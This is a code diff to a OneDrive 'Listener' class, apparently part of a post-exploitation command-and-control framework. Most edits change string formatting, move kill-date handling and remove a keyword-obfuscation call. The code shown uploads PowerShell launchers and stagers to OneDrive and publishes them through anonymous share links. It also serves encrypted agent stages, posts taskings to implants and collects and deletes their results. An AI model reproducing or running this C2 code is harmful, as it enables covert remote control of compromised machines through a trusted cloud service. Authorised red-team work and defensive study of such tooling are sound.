@@ -4,7 +4,6 @@ import logging
 import os
 import re
 import time
-from builtins import object, str
 from typing import List, Optional, Tuple
 
 from requests import Request, Session
@@ -19,8 +18,8 @@ LOG_NAME_PREFIX = __name__
 log = logging.getLogger(__name__)
 
 
-class Listener(object):
-    def __init__(self, mainMenu: MainMenu, params=[]):
+class Listener:
+    def __init__(self, mainMenu: MainMenu):
         self.info = {
             "Name": "Onedrive",
             "Authors": [
@@ -335,6 +334,7 @@ class Listener(object):
         base_folder = listenerOptions["BaseFolder"]["Value"]
         staging_folder = listenerOptions["StagingFolder"]["Value"]
         working_hours = listenerOptions["WorkingHours"]["Value"]
+        kill_date = listenerOptions["KillDate"]["Value"]
         agent_delay = listenerOptions["DefaultDelay"]["Value"]
 
         if language.lower() == "powershell":
@@ -348,6 +348,7 @@ class Listener(object):
 
             template_options = {
                 "working_hours": working_hours,
+                "kill_date": kill_date,
                 "staging_key": staging_key,
                 "token": token,
                 "refresh_token": refresh_token,
@@ -448,15 +449,12 @@ class Listener(object):
         jitter = listener_options["DefaultJitter"]["Value"]
         profile = listener_options["DefaultProfile"]["Value"]
         lost_limit = listener_options["DefaultLostLimit"]["Value"]
-        kill_date = listener_options["KillDate"]["Value"]
         b64_default_response = base64.b64encode(self.default_response().encode("UTF-8"))
 
         if language == "powershell":
             f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
             agent_code = f.read()
             f.close()
-
-            agent_code = self.mainMenu.obfuscationv2.obfuscate_keywords(agent_code)
 
             agent_code = helpers.strip_powershell_comments(agent_code)
 
@@ -477,11 +475,6 @@ class Listener(object):
                 '$DefaultResponse = ""',
                 '$DefaultResponse = "' + b64_default_response.decode("UTF-8") + '"',
             )
-
-            if kill_date != "":
-                agent_code = agent_code.replace(
-                    "$KillDate,", "$KillDate = '" + str(kill_date) + "',"
-                )
 
             agent_code = agent_code.replace("REPLACE_COMMS", "")
 
@@ -561,7 +554,7 @@ class Listener(object):
             if not (test_token(self.token["access_token"])):
                 raise ValueError("Could not set up folders, access token invalid")
 
-            base_object = s.get("%s/drive/root:/%s" % (base_url, base_folder))
+            base_object = s.get(f"{base_url}/drive/root:/{base_folder}")
             if not (base_object.status_code == 200):
                 self.instance_log.info(
                     f"{listener_name}: Creating {base_folder} folder"
@@ -580,9 +573,7 @@ class Listener(object):
                 log.info(message)
 
             for item in [staging_folder, taskings_folder, results_folder]:
-                item_object = s.get(
-                    "%s/drive/root:/%s/%s" % (base_url, base_folder, item)
-                )
+                item_object = s.get(f"{base_url}/drive/root:/{base_folder}/{item}")
                 if not (item_object.status_code == 200):
                     self.instance_log.info(
                         f"{listener_name}: Creating {base_folder}/{item} folder"
@@ -593,8 +584,9 @@ class Listener(object):
                         "name": item,
                     }
                     item_object = s.post(
-                        "%s/drive/items/%s/children"
-                        % (base_url, base_object.json()["id"]),
+                        "{}/drive/items/{}/children".format(
+                            base_url, base_object.json()["id"]
+                        ),
                         json=params,
                     )
                 else:
@@ -613,8 +605,9 @@ class Listener(object):
             )
 
             r = s.put(
-                "%s/drive/root:/%s/%s/%s:/content"
-                % (base_url, base_folder, staging_folder, "LAUNCHER-PS.TXT"),
+                "{}/drive/root:/{}/{}/{}:/content".format(
+                    base_url, base_folder, staging_folder, "LAUNCHER-PS.TXT"
+                ),
                 data=ps_launcher,
                 headers={"Content-Type": "text/plain"},
             )
@@ -622,7 +615,7 @@ class Listener(object):
             if r.status_code == 201 or r.status_code == 200:
                 item = r.json()
                 r = s.post(
-                    "%s/drive/items/%s/createLink" % (base_url, item["id"]),
+                    "{}/drive/items/{}/createLink".format(base_url, item["id"]),
                     json={"scope": "anonymous", "type": "view"},
                     headers={"Content-Type": "application/json"},
                 )
@@ -638,15 +631,16 @@ class Listener(object):
                 token=self.token["access_token"],
             )
             r = s.put(
-                "%s/drive/root:/%s/%s/%s:/content"
-                % (base_url, base_folder, staging_folder, "STAGE0-PS.txt"),
+                "{}/drive/root:/{}/{}/{}:/content".format(
+                    base_url, base_folder, staging_folder, "STAGE0-PS.txt"
+                ),
                 data=ps_stager,
                 headers={"Content-Type": "application/octet-stream"},
             )
             if r.status_code == 201 or r.status_code == 200:
                 item = r.json()
                 r = s.post(
-                    "%s/drive/items/%s/createLink" % (base_url, item["id"]),
+                    "{}/drive/items/{}/createLink".format(base_url, item["id"]),
                     json={"scope": "anonymous", "type": "view"},
                     headers={"Content-Type": "application/json"},
                 )
@@ -735,8 +729,9 @@ class Listener(object):
                     self.token["update"] = False
 
                 search = s.get(
-                    "%s/drive/root:/%s/%s?expand=children"
-                    % (base_url, base_folder, staging_folder)
+                    "{}/drive/root:/{}/{}?expand=children".format(
+                        base_url, base_folder, staging_folder
+                    )
                 )
                 for item in search.json()[
                     "children"
@@ -758,13 +753,14 @@ class Listener(object):
                             message = f"{listener_name}: Uploading {base_folder}/{staging_folder}/{agent_name}_2.txt, {str(len(return_val))} bytes"
                             self.instance_log.info(message)
                             s.put(
-                                "%s/drive/root:/%s/%s/%s_2.txt:/content"
-                                % (base_url, base_folder, staging_folder, agent_name),
+                                "{}/drive/root:/{}/{}/{}_2.txt:/content".format(
+                                    base_url, base_folder, staging_folder, agent_name
+                                ),
                                 data=return_val,
                             )
                             message = f"{listener_name} Deleting {base_folder}/{staging_folder}/{item['name']}"
                             self.instance_log.info(message)
-                            s.delete("%s/drive/items/%s" % (base_url, item["id"]))
+                            s.delete("{}/drive/items/{}".format(base_url, item["id"]))
 
                         if (
                             stage == "3"
@@ -801,13 +797,14 @@ class Listener(object):
                             message = f"{listener_name}: Uploading {base_folder}/{staging_folder}/{agent_name}_4.txt, {str(len(enc_code))} bytes"
                             self.instance_log.info(message)
                             s.put(
-                                "%s/drive/root:/%s/%s/%s_4.txt:/content"
-                                % (base_url, base_folder, staging_folder, agent_name),
+                                "{}/drive/root:/{}/{}/{}_4.txt:/content".format(
+                                    base_url, base_folder, staging_folder, agent_name
+                                ),
                                 data=enc_code,
                             )
                             message = f"{listener_name}: Deleting {base_folder}/{staging_folder}/{item['name']}"
                             self.instance_log.info(message)
-                            s.delete("%s/drive/items/%s" % (base_url, item["id"]))
+                            s.delete("{}/drive/items/{}".format(base_url, item["id"]))
 
                     except Exception:
                         message = f"{listener_name}: Could not handle agent staging, continuing"
@@ -824,8 +821,9 @@ class Listener(object):
                     if task_data:
                         try:
                             r = s.get(
-                                "%s/drive/root:/%s/%s/%s.txt:/content"
-                                % (base_url, base_folder, taskings_folder, agent_id)
+                                "{}/drive/root:/{}/{}/{}.txt:/content".format(
+                                    base_url, base_folder, taskings_folder, agent_id
+                                )
                             )
                             if (
                                 r.status_code == 200
@@ -836,8 +834,9 @@ class Listener(object):
                             self.instance_log.info(message)
 
                             r = s.put(
-                                "%s/drive/root:/%s/%s/%s.txt:/content"
-                                % (base_url, base_folder, taskings_folder, agent_id),
+                                "{}/drive/root:/{}/{}/{}.txt:/content".format(
+                                    base_url, base_folder, taskings_folder, agent_id
+                                ),
                                 data=task_data,
                             )
                         except Exception as e:
@@ -845,8 +844,9 @@ class Listener(object):
                             self.instance_log.error(message, exc_info=True)
 
                 search = s.get(
-                    "%s/drive/root:/%s/%s?expand=children"
-                    % (base_url, base_folder, results_folder)
+                    "{}/drive/root:/{}/{}?expand=children".format(
+                        base_url, base_folder, results_folder
+                    )
                 )
                 for item in search.json()[
                     "children"
@@ -861,11 +861,12 @@ class Listener(object):
                                 f"{listener_name}: Invalid agent, deleting {results_folder}/{item['name']} and restaging"
                             )
                             s.put(
-                                "%s/drive/root:/%s/%s/%s.txt:/content"
-                                % (base_url, base_folder, taskings_folder, agent_id),
+                                "{}/drive/root:/{}/{}/{}.txt:/content".format(
+                                    base_url, base_folder, taskings_folder, agent_id
+                                ),
                                 data="RESTAGE",
                             )
-                            s.delete("%s/drive/items/%s" % (base_url, item["id"]))
+                            s.delete("{}/drive/items/{}".format(base_url, item["id"]))
                             continue
 
                         with SessionLocal() as db:
@@ -884,7 +885,7 @@ class Listener(object):
                             )
                             message = f"{listener_name}: Deleting {results_folder}/{item['name']}"
                             self.instance_log.info(message)
-                            s.delete("%s/drive/items/%s" % (base_url, item["id"]))
+                            s.delete("{}/drive/items/{}".format(base_url, item["id"]))
                     except Exception as e:
                         message = f"{listener_name}: Error handling agent results for {item['name']}, {e}"
                         self.instance_log.error(message, exc_info=True)
